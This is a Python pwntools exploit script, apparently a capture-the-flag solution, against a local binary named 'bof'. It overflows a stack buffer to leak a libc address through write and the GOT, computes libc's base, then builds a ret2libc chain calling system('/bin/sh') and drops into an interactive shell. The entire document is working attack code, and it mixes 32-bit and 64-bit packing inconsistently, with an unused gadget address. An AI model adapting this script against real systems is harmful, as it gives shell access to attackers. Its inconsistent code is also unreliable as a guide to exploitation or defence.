from pwn import *
p=process("./bof")
context.log_level='debug'
b=ELF("./bof")
lib=b.libc
prdi=0x4005d3

pay=b'x'*68
pay+=p64(b.plt['write'])
pay+=p64(b.symbols['main'])   
pay+=p64(1)
pay+=p32(b.got['gets'])
pay+=p32(4)

p.sendlineafter("input msg >",pay)

libcbase=u32(p.recv(4))-lib.symbols['gets']
log.info(hex(libcbase))

system=libcbase+lib.symbols['system']
binsh=libcbase+list(lib.search(b"/bin/sh"))[0]
log.info(hex(system))
log.info(hex(binsh))

pay2=b'x'*68
pay2+=p32(system)
pay2+=p32(0)
pay2+=p32(binsh)

p.sendlineafter("input msg >",pay2)

p.interactive()
